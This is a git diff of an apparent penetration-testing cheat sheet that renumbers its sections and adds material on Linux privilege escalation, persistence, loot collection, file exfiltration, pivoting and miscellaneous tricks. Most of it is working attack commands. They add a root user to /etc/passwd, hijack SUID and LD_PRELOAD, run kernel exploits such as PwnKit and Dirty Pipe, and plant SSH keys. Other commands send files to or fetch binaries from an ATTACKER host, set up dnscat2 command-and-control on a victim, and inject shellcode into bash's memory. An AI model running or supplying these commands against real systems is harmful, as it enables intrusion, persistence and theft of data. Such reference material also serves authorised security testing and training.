+### 7.2.2 Adding root user to /etc/shadow or /etc/passwd
 
 ```sh
 # if /etc/shadow is writable
@@ -5070,12 +6396,15 @@ echo "derp:$(openssl passwd -6 herpderp):0:0:root:/root:/bin/bash" >> /etc/passw
 # alternatively
 echo "derp:$(mkpasswd -m sha-512 herpderp):0:0:root:/root:/bin/bash" >> /etc/passwd
 # pre-computed for password 'herpderp':
-echo 'derp:$5$herpderp$pkbOJ3TJ8UP4oCW0.B5bzt3vNeHCXClgwE2efw60p.6:root:/root:/bin/bash' >> /etc/passwd
+echo 'derp:$5$herpderp$pkbOJ3TJ8UP4oCW0.B5bzt3vNeHCXClgwE2efw60p.6:0:0:root:/root:/bin/bash' >> /etc/passwd
+
+# the empty/blank crypt hash for old Linux systems is U6aMy0wojraho.
+# if you see this in an /etc/passwd (or shadow), the user has no password!
 
 # can also add generated password between the first and second colon of root user
 ```
 
-### 6.2.3 Grant passwordless sudo access
+### 7.2.3 Grant passwordless sudo access
 
 Edit the `/etc/sudoers` file to have the following line:
 
@@ -5083,7 +6412,7 @@ Edit the `/etc/sudoers` file to have the following line:
 myuser ALL=(ALL) NOPASSWD: ALL
 ```
 
-### 6.2.4 LD_PRELOAD and LD_LIBRARY_PATH
+### 7.2.4 LD_PRELOAD and LD_LIBRARY_PATH
 
 For this to work, `sudo -l` must show that either LD_PRELOAD or LD_LIBRARY_PATH
 are inherited from the user's environment:
@@ -5145,7 +6474,7 @@ sudo LD_LIBRARY_PATH=/tmp apache2
 # being called (must exactly match function signature)
 ```
 
-### 6.2.5 Hijacking SUID binaries
+### 7.2.5 Hijacking SUID binaries
 
 `inject.c`:
 ```c
@@ -5226,7 +6555,7 @@ which is used to display debug information (debug mode when `SHELLOPTS=xtrace`).
 env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
 ```
 
-### 6.2.6 Using NFS for Privilege Escalation
+### 7.2.6 Using NFS for Privilege Escalation
 
 NFS Shares inherit the **remote** user ID, so if root-squashing is disabled,
 something owned by root remotely is owned by root locally.
@@ -5247,7 +6576,7 @@ chmod +xs /tmp/nfs/shell.elf
 /tmp/shell.elf
 ```
 
-### 6.2.7 Using Docker for Privesc
+### 7.2.7 Using Docker for Privesc
 
 This is possible when the user is a member of the `docker` group.
 
@@ -5260,11 +6589,11 @@ docker run --rm -it -v /:/mnt --privileged ubuntu bash
 From there, add your ssh key to `/mnt/root/.ssh/authorized_keys` or update the
 `/mnt/etc/passwd` file to include an additional malicious root user.
 
-### 6.2.8 Linux Kernel Exploits
+### 7.2.8 Linux Kernel Exploits
 
 ⚠ **NOTE**: Use LinPEAS to enumerate for kernel vulnerabilities. Searchsploit is often less effective.
 
-#### 6.2.8.1 Dirty Cow
+#### 7.2.8.1 Dirty Cow
 
 [CVE-2016-5195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2016-5195) is effective against Linux kernels 2.x through 4.x before 4.8.3.
 
@@ -5282,7 +6611,7 @@ echo 0 > /proc/sys/vm/dirty_writeback_centisecs
 ```
 
 
-#### 6.2.8.2 PwnKit
+#### 7.2.8.2 PwnKit
 
 [CVE-2021-4034](https://nvd.nist.gov/vuln/detail/cve-2021-4034) PwnKit is effective against many Linux variants:
 - Ubuntu 10 - Ubuntu 21.10
@@ -5307,7 +6636,7 @@ chmod +x ./pwnkit
 ```
 
 
-#### 6.2.8.3 Get-Rekt BPF Sign Extension LPE
+#### 7.2.8.3 Get-Rekt BPF Sign Extension LPE
 
 [CVE-2017-16995](https://nvd.nist.gov/vuln/detail/CVE-2017-16995) is effective against Linux kernel 4.4.0 - 4.14.10.
 - Debian 9
@@ -5326,7 +6655,7 @@ gcc cve-2017-16995.c -o cve-2017-16995
 ```
 
 
-#### 6.2.8.4 Dirty Pipe
+#### 7.2.8.4 Dirty Pipe
 
 [CVE-2022-0847](https://nvd.nist.gov/vuln/detail/CVE-2022-0847) affects Linux kernels 5.8.x up. The vulnerability was fixed in Linux 5.16.11, 5.15.25 and 5.10.102.
 - RHEL 8.0 - 8.4
@@ -5353,11 +6682,11 @@ mv /tmp/passwd.bak /etc/passwd
 
 
 
-## 6.3 Linux Persistence
+## 7.3 Linux Persistence
 
 Many of the techniques for privilege escalation can be used to also maintain persistence (particularly ones where you modify a file).
 
-### 6.3.1 Add SSH key to authorized_keys
+### 7.3.1 Add SSH key to authorized_keys
 
 You can add your key to either `root` or a user with (passwordless) sudo.
 
@@ -5373,7 +6702,7 @@ mkdir -pm700 /root/.ssh
 echo "PASTEYOURSSHPUBKEY" >> /root/.ssh/authorized_keys
 ```
 
-### 6.3.2 Set SUID bit
+### 7.3.2 Set SUID bit
 
 If you set the SUID bit of a root-owned executable, like `/bin/sh` or `less`
 or `find` (see [GTFOBins](https://gtfobins.github.io/#+shell) for more), you can use those to give yourself a root shell. This is a kind of privesc backdoor.
@@ -5383,7 +6712,7 @@ sudo chmod u+s /bin/sh
 ```
 
 
-## 6.4 Miscellaneous Linux Commands
+## 7.4 Miscellaneous Linux Commands
 
 ```sh
 # make sure terminal environment is good, if not working right
@@ -5392,7 +6721,7 @@ export TERM=xterm-256color
 ```
 
 
-### 6.4.1 Awk & Sed
+### 7.4.1 Awk & Sed
 
 Sometimes there is a lot of extra garbage in the loot you grab. It's nice to
 be able to quickly sift through it to get the parts you care about.
@@ -5405,7 +6734,7 @@ sed -n '/PAT1/,/PAT2/{//!p;}' FILE
 sed '/PAT1/,/PAT2/!d;//d' FILE
 ```
 
-## 6.5 Linux Files of Interest
+## 7.5 Linux Files of Interest
 
 ```sh
 # quick command to grab the goods
@@ -5424,15 +6753,15 @@ tar zcf loot.tar.gz \
 /root/proof.txt
 ```
 
-# 7 Loot
+# 8 Loot
 
-## 7.1 Sensitive Files
+## 8.1 Sensitive Files
 
 The following are some files that have sensitive information that
 are good to try to grab when you can (directory traversal, LFI, shell access).
 
 
-### 7.1.1 Sensitive Files on Linux
+### 8.1.1 Sensitive Files on Linux
 
 Also check out [Linux Files of Interest](#6.13%20Linux%20Files%20of%20Interest).
 
@@ -5484,7 +6813,7 @@ find / -xdev -type f -readable -name '.*profile' -ls 2>/dev/null
 ```
 
 
-### 7.1.2 Sensitive Files on Windows
+### 8.1.2 Sensitive Files on Windows
 
 Also check out:
 - [Windows Passwords & Hashes](#5.8%20Windows%20Passwords%20&%20Hashes)
@@ -5566,7 +6895,7 @@ More Windows IIS log and config paths [here](https://techcommunity.microsoft.com
 
 
 
-### 7.1.3 Sensitive Files - Generic
+### 8.1.3 Sensitive Files - Generic
 
 ```powershell
 *.kdbx # KeePass database
@@ -5575,11 +6904,11 @@ Get-ChildItem -Path C:\ -File -Recurse -ErrorAction SilentlyContinue -Include *.
 
 
 
-## 7.2 File Transfers
+## 8.2 File Transfers
 
 **Great resource**: [HackTricks - Exfiltration](https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration) 🎉 🎉 🎉
 
-### 7.2.1 Netcat transfer
+### 8.2.1 Netcat transfer
 
 ```sh
 # start listening for download on port 9001
@@ -5588,7 +6917,7 @@ nc -nlvp 9001 > dump.txt
 nc $IP 9001 < file.txt
 ```
 
-### 7.2.2 Curl transfers
+### 8.2.2 Curl transfers
 
 ```sh
 # upload a file with curl (POST multipart/form-data)
@@ -5596,7 +6925,7 @@ nc $IP 9001 < file.txt
 curl -v -F key1=value1 -F upload=@localfilename URL
 ```
 
-### 7.2.3 PHP File Uploads
+### 8.2.3 PHP File Uploads
 
 Uploading files via HTTP POST to `upload.php`:
 
@@ -5654,7 +6983,7 @@ max_execution_time = 120  # allow uploads to take 2 minutes
 
 **Note:** The .user.ini file goes in your site’s document root.
 
-### 7.2.4 PowerShell File Transfers
+### 8.2.4 PowerShell File Transfers
 
 ```powershell
 # Download to Windows victim
@@ -5667,14 +6996,14 @@ invoke-webrequest -uri http://ATTACKER/rsh.exe -out c:\users\public\rsh.exe
 (New-Object System.Net.WebClient).UploadFile('http://LISTEN_IP/upload.php','somefiile')
 ```
 
-### 7.2.5 Mount NFS Share
+### 8.2.5 Mount NFS Share
 
 ```sh
 # try without vers=3 if mount fails. Also try with vers=2
 mount -t nfs -o vers=3 REMOTE_IP:/home/ /mnt/nfs-share
 ```
 
-### 7.2.6 SMB Share
+### 8.2.6 SMB Share
 
 Sharing entire `C:/` drive as SMB share for malicious user:
 ```bat
@@ -5693,7 +7022,7 @@ sudo impacket-smbserver -smb2support share .
 # To work with Windows 10+
 impacket-smbserver -smb2support -user derp -password herpderp share .
 # to connect on Windows with creds:
-# net use \\10.10.14.14 /user:derp herpderp 
+# net use \\ATTACKER_IP herpderp /user:derp
 ```
 
 Using curl to upload file to windows SMB share
@@ -5709,7 +7038,7 @@ smbclient //$VICTIM_IP/SHARENAME
 > mget *
 ```
 
-### 7.2.7 FTP Server on Kali
+### 8.2.7 FTP Server on Kali
 
 ```sh
 # install pyftpdlib for root to use port 21
@@ -5766,7 +7095,7 @@ chown -R ftpuser:ftpgroup /ftphome/
 
 
 
-### 7.2.8 WebDAV
+### 8.2.8 WebDAV
 
 We can host a WebDAV server on our Kali box for pushing/pulling files from other hosts, especially Windows machines using a Library file pointing to the WebDAV share.
 
@@ -5859,7 +7188,7 @@ References:
 
 
 
-### 7.2.9 SSHFS
+### 8.2.9 SSHFS
 
 To make things easier, set up a config file like so:
 
@@ -5879,7 +7208,7 @@ Then mount the filesystem with root access:
 sshfs -F/full/path/to/ssh-config alpha:/ ./rootfs
 ```
 
-### 7.2.10 Windows LOLBAS File Downloads
+### 8.2.10 Windows LOLBAS File Downloads
 
 ```powershell
 # Download 7zip binary to ./7zip.exe, using urlcache or verifyctl
@@ -5896,12 +7225,12 @@ powershell -c "(new-object System.Net.WebClient).DownloadFile('http://7-zip.org/
 powershell iwr -uri http://7-zip.org/a/7z1604-x64.exe -outfile 7zip.exe
 ```
 
-# 8 Pivoting and Redirection
+# 9 Pivoting and Redirection
 
 These are techniques for "traffic bending" or "traffic shaping" or
 "tunneling traffic" or "port redirection" or "port forwarding".
 
-## 8.1 SSH Tunnels
+## 9.1 SSH Tunnels
 
 Before starting, it is best to have the following settings enabled in the jumpbox
 `/etc/ssh/sshd_config` file.
@@ -6068,7 +7397,7 @@ connection is established so you can keep using your terminal.
 - `-g` and `-R` enable "Gateway" ports and do "Remote" port forwarding
 
 
-### 8.1.1 Ad Hoc SSH Port Forwards
+### 9.1.1 Ad Hoc SSH Port Forwards
 
 TL;DR:
 
@@ -6083,7 +7412,7 @@ The ssh prompt will change to `ssh>` when you enter ad hoc command line mode.
 
 Typing `help` in ad hoc command line mode shows command syntax examples.
 
-### 8.1.2 SSH on Windows
+### 9.1.2 SSH on Windows
 
 SSH comes with Windows 10 by default since 1803 (and optionally since 1709). It's found in the `%systemdrive%\Windows\System32\OpenSSH` folder. Use `ssh.exe` just like `ssh` on Linux.
 
@@ -6112,7 +7441,7 @@ cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l portfwd -pw herpderp -N -R
 ```
 
 
-### 8.1.3 Creating restricted user for ssh port forwarding only
+### 9.1.3 Creating restricted user for ssh port forwarding only
 
 This is valuable for working with `plink.exe` on Windows, which requires entering your password in plaintext into the command line, which isn't ideal for security.
 
@@ -6145,7 +7474,7 @@ Match User portfwd
 Finally, you MUST include the `-N` flag (no commands) when connecting over ssh, so you don't get booted when `/usr/sbin/false` returns an error.
 
 
-## 8.2 SOCKS Proxies and proxychains
+## 9.2 SOCKS Proxies and proxychains
 
 `proxychains` is great for tunneling TCP traffic through a SOCKS proxy (like
 what `ssh -D` and `chisel -D` give you).
@@ -6174,6 +7503,11 @@ export PROXYRESOLVE_DNS=REMOTE_DNS_SVR
 # /etc/proxychains.conf:
 tcp_read_time_out 1000
 tcp_connect_time_out 500
+
+
+# ssh doesn't seem to work through proxychains.
+# to tunnel ssh through a SOCKS proxy:
+ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' victim@VICTIM_IP
 ```
 
 > ⚠ **NOTE**: To scan TCP with nmap through a SOCKS proxy, only full-connection scans are possible! (nmap option flag `-sT`). It's also often necessary to tell nmap to assume the host is up (`-Pn`). Until nmap's `--proxy` flag is stable, use `proxychains nmap` instead.
@@ -6181,26 +7515,41 @@ tcp_connect_time_out 500
 > By default, Proxychains is configured with very high time-out values. This can make port scanning really slow. Lowering the `tcp_read_time_out` and `tcp_connect_time_out` values in `/etc/proxychains4.conf` will force time-out on non-responsive connections more quickly. This can dramatically speed up port-scanning times. I used `tcp_read_time_out 1000` and `tcp_connect_time_out 500` successfully.
 
 
-## 8.3 Bending with socat
+## 9.3 Bending with sshuttle
+
+[Sshuttle](https://sshuttle.readthedocs.io/en/stable/usage.html) is a python library that handles setting up a combination of IPTABLES rules and SSH proxy tunnels to transparently route all traffic to a target internal subnet easily.
+
+```sh
+# sshuttle is most useful when you combine it with a multihop
+# configuration like so:
+# kali -> jumpbox1 (socat listening on 2222) -> DMZ_net (10.1.1.0/24) -> jumpbox2 (ssh) -> internal_net (172.16.2.0/24)
+
+# on kali, run:
+# the CIDR IPs are the target subnets you want sshuttle to route
+# through your tunnel transparently.
+sshuttle --dns -r jumpbox2_user@jumpbox1_ip:2222 10.1.1.0/24 172.16.2.0/24
+```
+
+## 9.4 Bending with socat
 
 On the jump-box:
 
 ```sh
 # basic port forwarding with socat listener
-sudo socat -ddd TCP-LISTEN:80,fork TCP:REMOTE_HOST_IP:80
+sudo socat -dd TCP-LISTEN:80,fork TCP:REMOTE_HOST_IP:80
 # optionally, do same thing bound to specific interface IP
-sudo socat -ddd TCP-LISTEN:80,bind=10.0.0.2,fork TCP:REMOTE_HOST_IP:80
+sudo socat -dd TCP-LISTEN:80,bind=10.0.0.2,fork TCP:REMOTE_HOST_IP:80
 
 # UDP relay
-socat -ddd -u UDP-RECVFROM:1978,fork,reuseaddr UDP-SENDTO:10.1.1.89:1978
+socat -dd -u UDP-RECVFROM:1978,fork,reuseaddr UDP-SENDTO:10.1.1.89:1978
 
 # IPv4 to IPv6 tunnel
-sudo socat -ddd TCP-LISTEN:110,reuseaddr,fork 'TCP6:[fe80::dead:beef%eth0]:110'
+sudo socat -dd TCP-LISTEN:110,reuseaddr,fork 'TCP6:[fe80::dead:beef%eth0]:110'
 
 # TCP to Unix Domain Socket
-socat -ddd TCP-LISTEN:1234,reuseaddr,fork UNIX-CLIENT:/tmp/foo
+socat -dd TCP-LISTEN:1234,reuseaddr,fork UNIX-CLIENT:/tmp/foo
 # more secure version
-socat -ddd TCP-LISTEN:1234,reuseaddr,fork,su=nobody,range=127.0.0.0/8 UNIX-CLIENT:/tmp/foo
+socat -dd TCP-LISTEN:1234,reuseaddr,fork,su=nobody,range=127.0.0.0/8 UNIX-CLIENT:/tmp/foo
 ```
 
 General socat syntax
@@ -6223,7 +7572,29 @@ Other useful addresses:
  - `UNIX-CONNECT:filename` and `UNIX-LISTEN:filename`
  - `PIPE` or `PIPE:filename`
 
-## 8.4 Bending with iptables
+## 9.5 Bending with netcat
+
+Netcat combined lets you do traffic bending. It's a crude (but effective) tool.
+
+```powershell
+# WINDOWS pivot
+# enter temporary directory to store relay.bat
+cd %temp%
+# create relay.bat to connect to victim service
+echo nc $VICTIM_IP VICTIM_PORT > relay.bat
+# Set up pivot listener (-L is persistent listener)
+nc –L -p LISTEN_PORT –e relay.bat
+```
+
+```sh
+# LINUX pivot
+# requires named pipe to join sender & receiver
+mkfifo /tmp/bp  # backpipe
+nc –lnp LISTEN_PORT 0<bp | nc $VICTIM_IP VICTIM_PORT | tee bp
+# 'tee' lets you inspect bytes on the wire
+```
+
+## 9.6 Bending with iptables
 
 Iptables forwarding requires `root` privileges.
 
@@ -6259,7 +7630,7 @@ sudo service iptables-persistent save
 
 
 
-## 8.5 Bending with rinetd
+## 9.7 Bending with rinetd
 
 Better suited for **long-term** redirections.
 
@@ -6273,7 +7644,7 @@ bindaddress bindport connectaddress connectport
 
 The `kill -1` signal (`SIGHUP`) can be used to cause rinetd to reload its configuration file without interrupting existing connections. Under Linux the process id is saved in the file `/var/run/rinetd.pid` to facilitate the `kill -HUP`. Or you can do a hard restart via `sudo service rinetd restart`.
 
-## 8.6 Bending with netsh on Windows
+## 9.8 Bending with netsh on Windows
 
 If you own a dual-homed internal Windows box that you want to pivot from, you
 can set up port forwarding using the `netsh` utility.
@@ -6305,64 +7676,81 @@ sudo nmap -T4 -sS -Pn -n -p4445 WINDOWS_IP
 netsh advfirewall firewall delete rule name="derp"
 ```
 
-## 8.7 Bending with sshuttle
+## 9.9 Bending with chisel
 
-[Sshuttle](https://sshuttle.readthedocs.io/en/stable/usage.html) is a python library that handles setting up a combination of IPTABLES rules and SSH proxy tunnels to transparently route all traffic to a target internal subnet easily.
+[Chisel](https://github.com/jpillora/chisel) lets you securely tunnel using HTTP as a transport, allowing you to get through Deep Packet Inspection (DPI) firewalls to forward ports or set up a SOCKS proxy.
 
-```sh
-# sshuttle is most useful when you combine it with a multihop
-# configuration like so:
-# kali -> jumpbox1 (socat listening on 2222) -> DMZ_net (10.1.1.0/24) -> jumpbox2 (ssh) -> internal_net (172.16.2.0/24)
-
-# on kali, run:
-# the CIDR IPs are the target subnets you want sshuttle to route
-# through your tunnel transparently.
-sshuttle --dns -r jumpbox2_user@jumpbox1_ip:2222 10.1.1.0/24 172.16.2.0/24
-```
-
-## 8.8 Bending with chisel
-
-[Chisel](https://github.com/jpillora/chisel) lets you securely tunnel through firewalls and set up a SOCKS proxy through your tunnel.
-
-[Basic SOCKS usage](https://vegardw.medium.com/reverse-socks-proxy-using-chisel-the-easy-way-48a78df92f29)
+The most common way to use it is as a Reverse SOCKS proxy (reference: [Reverse SOCKS guide](https://vegardw.medium.com/reverse-socks-proxy-using-chisel-the-easy-way-48a78df92f29)). Example of Reverse SOCKS proxy setup:
 
 ```bash
-# on attack box:
-./chisel server -p 8080 --reverse
+# on attack box
+# start reverse socks proxy server on port 8080:
+chisel server -p 8000 --reverse
 
-# on jumpbox (Windows example)
-chisel-x64.exe client attacker_ip:8080 R:socks
+# grab windows chisel.exe binary from:
+# https://github.com/jpillora/chisel/releases/latest/
+
+# on jumpbox (Windows example), set up reverse SOCKS proxy
+chisel-x64.exe client attacker_ip:8000 R:socks
 
 # then use proxychains from attack box like normal
+
+# to do reverse port forwarding so kali can reach internal address,
+# add the following to the previous command:
+R:2222:VICTIM_IP:22
+
+# to tunnel ssh through a SOCKS proxy without proxychains:
+ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:8000 %h %p' victim@VICTIM_IP
 ```
 
-[Full documentation/repo](https://github.com/jpillora/chisel)
+> ⚠ **NOTE**: The chisel installed on Kali doesn't always play nice with other Linux hosts. Always download the client binary from the repo!
 
-## 8.9 Bending with netcat
+## 9.10 Bending with `dnscat2`
 
-Netcat combined lets you do traffic bending. It's a crude (but effective) tool.
-
-```powershell
-# WINDOWS pivot
-# enter temporary directory to store relay.bat
-cd %temp%
-# create relay.bat to connect to victim service
-echo nc $VICTIM_IP VICTIM_PORT > relay.bat
-# Set up pivot listener (-L is persistent listener)
-nc –L -p LISTEN_PORT –e relay.bat
-```
+[Dnscat2](https://github.com/iagox86/dnscat2) is a tool for securely tunneling traffic through DNS queries in order to perform C2 functions on a victim. It has a server and a client binary. You run the server on a DNS nameserver you own. You run the client on a victim. Once a client establishes a session with the server, you can use a command interface on the server (kinda like msfconsole) to interact with the client. This includes setting up port forwarding rules.
 
 ```sh
-# LINUX pivot
-# requires named pipe to join sender & receiver
-mkfifo /tmp/bp  # backpipe
-nc –lnp LISTEN_PORT 0<bp | nc $VICTIM_IP VICTIM_PORT | tee bp
-# 'tee' lets you inspect bytes on the wire
+# on your DNS Nameserver, start the dnscat2 server:
+dnscat2-server mydomain.com
+
+# on your victim, start the dnscat2 client
+./dnscat mydomain.com
+
+
+# on your DNS Nameserver, in the dnscat2 command shell:
+# list active sessions (windows)
+dnscat2> windows
+# interact with window/session 1
+dnscat2> window -i 1
+# get help, listing all commands
+command (victim01) 1> ? # or 'help'
+# get command help for 'listen' (sets up local fwd like ssh -L)
+command (victim01) 1> listen --help
+# start local port forwarding
+command (victim01) 1> listen 0.0.0.0:4455 VICTIM_IP:445
+# if you mess up and have to change the listening port,
+# you have to kill the client and restart it.
+# It's usually better to just pick a different listen port if you can.
+# return to main command screen
+command (victim01) 1> shutdown
+# (after restarting victim client, you can retry your port forward)
+# if you want to return to the top level command window
+# without killing the client:
+command (victim01) 1> suspend
+
+
+# on kali:
+# now you can use your newly forwarded port to reach inside the victim network:
+smbclient -U victim --password=victimpass -p 4455 -L //NAMESERVER_IP/
+# connection will be very slow.
 ```
 
-# 9 Miscellaneous
 
-## 9.1 Port Knocking
+
+
+# 10 Miscellaneous
+
+## 10.1 Port Knocking
 
 ```sh
 # port knock on ports 24->23->22 with nmap
@@ -6377,14 +7765,14 @@ nc -z $VICTIM_IP 22-24
 
 If you're able to read files on the victim, check out their `/etc/knockd.conf`
 
-## 9.2 Convert text to Windows UTF-16 format on Linux
+## 10.2 Convert text to Windows UTF-16 format on Linux
 
 ```sh
 # useful for encoding a powershell command in base64
 echo "some text" | iconv -t UTF-16LE
 ```
 
-## 9.3 Extract UDP pcap packet payload data
+## 10.3 Extract UDP pcap packet payload data
 
 Using scapy:
 
@@ -6412,7 +7800,7 @@ tshark -r udp.pcap -w udp.hex -Y udp -T fields -e udp.payload | tr -d '\n' | xxd
 # xxd: cannot combine '-r -p' like '-rp'
 ```
 
-## 9.4 Execute Shellcode from Bash
+## 10.4 Execute Shellcode from Bash
 
 ```sh
 cd /proc/$$;exec 3>mem;echo "McBQaC8vc2hoL2JpbonjUFOJ4bALzYA=" | base64 -d | dd bs=1 seek=$(($((16#`cat maps | grep /bin/bash | cut -f1 -d- | head -n 1`)) + $((16#300e0))))>&3
@@ -6428,9 +7816,9 @@ Explained:
    -  `0x300e0` is the location of bash’s exit function in memory
    -  Net result: You overwrite bash’s exit function with the shellcode
 
-## 9.5 Encryption
+## 10.5 Encryption
 
-### 9.5.1 Create self-signed SSL/TLS certificate
+### 10.5.1 Create self-signed SSL/TLS certificate
 
 ```sh
 # generate separate .key and .crt files
@@ -6451,7 +7839,7 @@ openssl req -x509 -new -nodes -key ca.key -sha256 -days 365 -out client.pem
 openssl pkcs12 -export -in client.pem -inkey ca.key -out client.p12
 ```
 
-### 9.5.2 Decrypting files with GPG
+### 10.5.2 Decrypting files with GPG
 
 ```sh
 # import public and private keys into gpg
@@ -6467,7 +7855,7 @@ gpg --list-secret-keys
 gpg -d -o secret.txt secret.txt.gpg
 ```
 
-## 9.6 Validating Checksums
+## 10.6 Validating Checksums
 
 This is how you validate a sha256 checksum for a file:
 
@@ -6480,7 +7868,7 @@ echo "4987776fef98bb2a72515abc0529e90572778b1d7aeeb1939179ff1f4de1440d Nessus-10
 sha256sum -c sha256sum_nessus
 ```
 
-## 9.7 Inspecting Files with Exiftool
+## 10.7 Inspecting Files with Exiftool
 
 We can examine the metadata of files with `exiftool`, which can reveal a lot of useful information. This information may be helpful for client-side attacks.
 
@@ -6507,4 +7895,6 @@ References:
 
 - [List of tags recognized by `exiftool`](https://exiftool.org/TagNames/)
 - [Exiftool download](https://exiftool.org) - shows list of supported files
+
+
 
